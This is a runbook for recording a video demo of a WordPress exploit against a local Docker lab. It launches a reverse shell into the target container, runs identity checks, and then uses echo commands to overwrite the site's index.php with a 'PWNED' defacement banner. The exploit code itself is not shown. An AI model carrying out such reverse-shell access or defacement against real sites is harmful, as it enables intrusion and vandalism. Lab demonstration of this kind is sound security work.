# Video run

Use two PowerShell windows. Docker Desktop must already be running.

## 1. Start the victim

In the left window:

```powershell
.\START-LAB.cmd
```

Wait for:

```text
TARGET_URL=http://127.0.0.1:18540/
PHP=8.3.35
WORDPRESS=7.1.2
STATUS=READY
```

Open `http://127.0.0.1:18540/` in Chrome. Show that the ordinary WordPress
homepage loads before running the exploit.

## 2. Run the exploit

In the right window:

```powershell
.\EXPLOIT.cmd
```

Do not type anything until the reverse-shell connection and shell prompt
appear. The prompt belongs to the target container. The runner does not print
a replacement prompt or send post-exploitation commands.

Type these commands yourself, one at a time:

```sh
whoami
id
hostname
pwd
```

The expected target identity is `www-data`, UID/GID 33,
`q618-wp8335-target`, and `/var/www/html`.

## 3. Change the lab homepage through the shell

At the same target shell, type these short commands one at a time:

```sh
echo '<body bgcolor=black text=lime><center><h2><pre>' > /var/www/html/index.php
echo ' _   _    _    ____  ____  _____ ____' >> /var/www/html/index.php
echo '| \ | |  / \  |  _ \/ ___|| ____/ ___|' >> /var/www/html/index.php
echo '|  \| | / _ \ | | | \___ \|  _|| |' >> /var/www/html/index.php
echo '| |\  |/ ___ \| |_| |___) | |__| |___' >> /var/www/html/index.php
echo '|_| \_/_/   \_\____/|____/|_____\____|' >> /var/www/html/index.php
echo '</pre></h2><h1>PWNED</h1></center>' >> /var/www/html/index.php
cat /var/www/html/index.php
```

Leave the shell open. Return to Chrome and refresh the same URL. The page now
shows the `NADSEC` ASCII banner and `PWNED` because `www-data` changed the
victim's real `index.php` through the reverse shell.

## 4. Clean up after recording

Stop recording, open another PowerShell window in this directory, and run:

```powershell
.\STOP-LAB.cmd
```

The next `START-LAB.cmd` restores the stock WordPress `index.php`, so the next
recording starts with the normal homepage again. To remove this lab's database
and web volumes as well:

```powershell
.\STOP-LAB.cmd -Reset
```

`-Reset` deletes only the package-owned Docker volumes.

## Recording checks

- Keep the printed target URL visible.
- Show the normal homepage before exploitation.
- Let `EXPLOIT.cmd` select the profile automatically.
- Type every shell command manually.
- Keep the real target hostname and `www-data` identity visible.
- Refresh the same URL after writing `index.php`.
- Do not use `exit`; leave the shell open until recording is finished.

This package accepts only its private, package-created Docker target. It is not
a public-target runner.

